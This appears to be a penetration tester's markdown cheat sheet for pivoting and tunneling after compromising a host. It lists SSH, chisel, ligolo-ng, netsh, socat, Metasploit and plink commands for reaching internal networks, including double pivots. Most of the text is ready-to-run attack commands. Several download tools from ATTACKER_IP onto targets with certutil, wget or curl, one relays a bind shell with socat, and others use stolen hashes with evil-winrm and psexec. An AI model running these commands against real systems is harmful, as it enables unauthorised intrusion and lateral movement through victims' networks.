---
tags: [pivot-needed, pivot, lateral, got-shell-linux, got-shell-windows, tunnel, chisel, ligolo, netsh, double-pivot]
---

# Pivoting & Tunneling

> Use when you find an internal network from a compromised host.
> Check `ip route && arp -a` (Linux) or `route print && arp -a` (Windows) after every foothold.

> **Chains:** Tunnel established → [01_recon.md](./01_recon.md) to scan the new network → [03_service_enum.md](./03_service_enum.md) for each service found

---

## Setup: Add Route Awareness

```bash
# Linux — after landing on pivot host
ip a
ip route
arp -a
cat /etc/hosts

# Windows
ipconfig /all
route print
arp -a
```

---

## 1 — SSH Tunneling

### Local Port Forward (bring remote service to your machine)

```bash
# Access $REMOTE_HOST:REMOTE_PORT via localhost:LOCAL_PORT
ssh -L LOCAL_PORT:REMOTE_HOST:REMOTE_PORT user@PIVOT_HOST

# Example: access internal web app at 10.10.10.5:80 via localhost:8080
ssh -L 8080:10.10.10.5:80 user@PIVOT_HOST
# Then browse to http://localhost:8080
```

### Dynamic SOCKS Proxy (route all traffic through pivot)

```bash
ssh -D 1080 -N user@PIVOT_HOST
# Then use proxychains:
# Add to /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -Pn -sT -p 22,80,443 10.10.10.5
proxychains crackmapexec smb 10.10.10.0/24
```

### Reverse Dynamic (when you can't SSH to pivot, but pivot can SSH to you)

```bash
# On PIVOT HOST:
ssh -R 1080 attacker@ATTACKER_IP
# On ATTACKER:
proxychains nmap ...
```

---

## 2 — Chisel (most reliable, works through firewalls)

```bash
# On attacker — start server
./chisel server --port 9090 --reverse

# On pivot — connect back and create SOCKS proxy
./chisel client ATTACKER_IP:9090 R:socks

# Now use proxychains with socks5 127.0.0.1 1080

# For specific port forward
# On attacker server:
./chisel server --port 9090 --reverse
# On pivot client:
./chisel client ATTACKER_IP:9090 R:8080:10.10.10.5:80
# Access internal 10.10.10.5:80 via localhost:8080
```

Transfer chisel to target:

```bash
# Python HTTP server on attacker
python3 -m http.server 8000

# On Windows target
certutil -urlcache -f http://ATTACKER_IP:8000/chisel.exe C:\Windows\Temp\chisel.exe
iwr http://ATTACKER_IP:8000/chisel.exe -o C:\Windows\Temp\chisel.exe

# On Linux target
wget http://ATTACKER_IP:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
curl http://ATTACKER_IP:8000/chisel -o /tmp/chisel && chmod +x /tmp/chisel
```

---

## 3 — Ligolo-ng (best for complex networks)

```bash
# On attacker — start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# On pivot — connect agent
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo-ng console:
session           # select session
ifconfig          # see pivot's network interfaces
start             # start tunnel

# Add route on attacker for internal network
sudo ip route add 10.10.10.0/24 dev ligolo
# or
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.10.0/24 dev ligolo

# Now nmap directly (no proxychains needed)
nmap -Pn -sV 10.10.10.5
```

---

## 4 — Proxychains Configuration

```bash
# /etc/proxychains4.conf — add at bottom:
socks5  127.0.0.1 1080   # for SSH -D or chisel

# Usage
proxychains nmap -Pn -sT -p 80,443,22,445 10.10.10.5
proxychains evil-winrm -i 10.10.10.5 -u Administrator -H HASH
proxychains impacket-psexec Administrator@10.10.10.5 -hashes :HASH
proxychains crackmapexec smb 10.10.10.0/24 -u user -p pass

# Note: nmap with proxychains must use -sT (TCP connect), not -sS (SYN)
```

---

## 5 — Netsh (Windows built-in — no tools needed)

```cmd
# Forward traffic arriving on this host to an internal target
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=10.10.10.5 connectport=80

# List active forwards
netsh interface portproxy show all

# Delete a rule
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080

# Open Windows firewall for the listening port (if needed)
netsh advfirewall firewall add rule name="pivot" dir=in action=allow protocol=TCP localport=8080
# Clean up:
netsh advfirewall firewall delete rule name="pivot"
```

> Use when you can't drop binaries on a Windows pivot host — netsh is built in.

---

## 6 — Socat (quick port forward, no agent needed)

```bash
# On pivot: forward localhost:LPORT to REMOTE_HOST:RPORT
socat TCP-LISTEN:LPORT,fork TCP:REMOTE_HOST:RPORT

# Example: expose internal web app
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80

# Bind shell relay
socat TCP-LISTEN:4444,fork EXEC:/bin/bash
```

---

## 7 — Double Pivot (two-hop routing)

```
Attacker → Pivot1 (has access to both networks) → Pivot2 → Target3
```

### Option A: Chisel chain (most reliable)

```bash
# On Attacker — one server handles all agents
./chisel server --port 9090 --reverse

# On Pivot1 — creates SOCKS proxy at attacker:1080 for first network
./chisel client ATTACKER_IP:9090 R:1080:socks

# On Pivot2 (reached via proxychains through Pivot1) — creates SOCKS at attacker:1081
proxychains ./chisel client ATTACKER_IP:9090 R:1081:socks

# /etc/proxychains4.conf for second network:
# socks5 127.0.0.1 1081
# proxychains nmap -Pn -sT 10.10.20.5
```

### Option B: Ligolo-ng (cleanest — no proxychains needed for traffic)

```bash
# On Attacker
./proxy -selfcert -laddr 0.0.0.0:11601

# On Pivot1 — connects as agent
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo console: select Pivot1 session
session          # select Pivot1
start            # start tunnel
sudo ip route add 10.10.10.0/24 dev ligolo   # first network reachable directly

# Reach Pivot2 via the first network, run agent on Pivot2
# In ligolo console: add a listener on Pivot1 that forwards to Pivot2 agent port
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601

# On Pivot2 — connects through Pivot1 listener
./agent -connect PIVOT1_IP:11602 -ignore-cert

# Back in ligolo console: select Pivot2 session
session          # select Pivot2
start
sudo ip route add 10.10.20.0/24 dev ligolo   # second network reachable directly
```

### Option C: SSH chain

```bash
# From Attacker — SOCKS for first network
ssh -D 1080 -N user@PIVOT1_IP

# From Pivot1 — SOCKS for second network (on Pivot1's localhost:1081)
proxychains ssh -D 1081 -N user@PIVOT2_IP

# Forward Pivot1:1081 back to Attacker using first tunnel
ssh -L 1081:localhost:1081 -N user@PIVOT1_IP   # run from Attacker

# /etc/proxychains4.conf for second network:
# socks5 127.0.0.1 1081
```

---

## 8 — Metasploit Routes (if using MSF)

```bash
# After getting a meterpreter session
route add 10.10.10.0/24 SESSION_ID

# Or use auxiliary/server/socks_proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
```

---

## 9 — Plink (Windows — when no SSH client)

```cmd
plink.exe -D 1080 user@ATTACKER_IP -N

# Local forward
plink.exe -L 8080:10.10.10.5:80 user@ATTACKER_IP -N
```

---

## After Establishing a Tunnel

```bash
# Scan the new network through proxychains (must use -sT not -sS with proxychains)
proxychains nmap -Pn -sT -p 22,80,443,139,445,3389,5985 10.10.10.0/24

# Or with ligolo (no proxychains needed — traffic routes directly)
nmap -Pn -sV 10.10.10.5
```

> **→ New hosts found:** [01_recon.md](./01_recon.md) — full port scan per host
> **→ Services found:** [03_service_enum.md](./03_service_enum.md)
> **→ AD services (88/389/445) found:** [06_active_directory.md](./06_active_directory.md)
> **→ Another internal subnet found:** repeat this file — set up a second tunnel (see Double Pivot above)

---

## File Transfer Quick Reference

```bash
# Python HTTP server (attacker)
python3 -m http.server 8000

# Linux target download
wget http://ATTACKER_IP:8000/file -O /tmp/file
curl http://ATTACKER_IP:8000/file -o /tmp/file

# Windows target download
certutil -urlcache -f http://ATTACKER_IP:8000/file.exe C:\Windows\Temp\file.exe
iwr http://ATTACKER_IP:8000/file.exe -o C:\Windows\Temp\file.exe
(New-Object System.Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/file.exe","C:\Windows\Temp\file.exe")

# SMB share (attacker)
impacket-smbserver share $(pwd) -smb2support
# Windows target:
copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\

# Base64 encode/decode for small files
# Attacker (encode)
base64 -w 0 file.exe
# Target (decode)
echo "BASE64STRING" | base64 -d > /tmp/file.exe      # Linux
[Convert]::FromBase64String("BASE64") | Set-Content -Path C:\file.exe -Encoding Byte  # Windows
```
